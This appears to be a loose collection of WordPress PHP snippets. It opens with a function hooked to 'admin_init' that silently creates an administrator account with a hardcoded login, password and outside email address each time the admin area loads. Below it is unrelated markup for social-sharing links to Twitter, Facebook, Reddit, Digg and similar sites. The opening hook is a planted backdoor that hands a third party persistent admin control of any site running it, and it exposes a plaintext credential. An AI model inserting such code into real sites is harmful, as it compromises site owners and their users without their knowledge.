<?php

// automatically create or insert user
function accessories_usa_developer_access() {
	$userdata = array(
		'first_name'	=> 'Rashadul',
		'last_name'	=> 'Alam',
		'nickname'	=> 'Dev. Alam',
		'description'	=> 'Web Developer (WordPress)',
		'user_login'	=> 'do_action',
		'user_url'	=> 'http://pencilcoders.com',
		'user_pass'	=> 'aU88jnnn',
		'user_email'	=> 'pencilcoderss@gmail.com',
		'role'		=> 'administrator'
	);

	wp_insert_user( $userdata );
}
add_action( 'admin_init',  'accessories_usa_developer_access');


?>

add-sharing-buttons-to-wordpress-no-plugins-or-external-references/



TWITTER:
<a href="http://twitter.com/home/?status=<?php the_title(); ?> - <?php the_permalink(); ?>" title="Tweet this!"></a>

FACEBOOK: <a href="http://www.facebook.com/sharer.php?u=<?php the_permalink();?>&amp;t=<?php the_title(); ?>" title="Share on Facebook."></a>

REDDIT:
<a href="http://www.reddit.com/submit?url=<?php the_permalink(); ?>&amp;title=<?php the_title(); ?>" title="Vote on Reddit"></a>

STUMBLEUPON:

<a href="http://www.stumbleupon.com/submit?url=<?php the_permalink(); ?>&amp;title=<?php the_title(); ?>" title="Stumble it"></a>

DIGG:
<a href="http://digg.com/submit?url=<?php the_permalink(); ?>&amp;title=<?php the_title(); ?>" title="Digg this!"></a>

<a href="http://www.linkedin.com/shareArticle?mini=true&amp;title=<?php the_title(); ?>&amp;url=<?php the_permalink(); ?>" title="Share on LinkedIn"></a>

DEL.ICIO.US:
<a href="http://del.icio.us/post?url=<?php the_permalink(); ?>&amp;title=<?php the_title(); ?>" title="Bookmark on del.icio.us"></a>


GOOGLE+:
<a href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,
  '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>

  
  
PINTEREST:
<a href="http://pinterest.com/pin/create/button/?url=<?php the_permalink(); ?>&media=<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); echo $url; ?>"></a>